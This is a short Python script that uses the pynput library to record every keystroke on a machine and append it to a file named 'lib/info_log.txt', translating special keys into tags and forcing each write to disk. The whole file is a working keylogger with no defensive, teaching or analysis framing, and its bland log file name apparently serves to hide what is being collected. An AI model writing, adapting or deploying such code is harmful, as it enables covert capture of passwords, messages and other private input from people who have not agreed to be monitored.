import os
from pynput import keyboard

log_file_path = "lib/info_log.txt"

def on_press(key):
    try:
        char = key.char if key.char is not None else "[ALT_GR]"
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.esc: "[ESC]",  
        }
        char = special_keys.get(key, f"[{key}]")  

    with open(log_file_path, "a") as log_file:
        log_file.write(char)
        log_file.flush()  
        os.fsync(log_file.fileno()) 

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

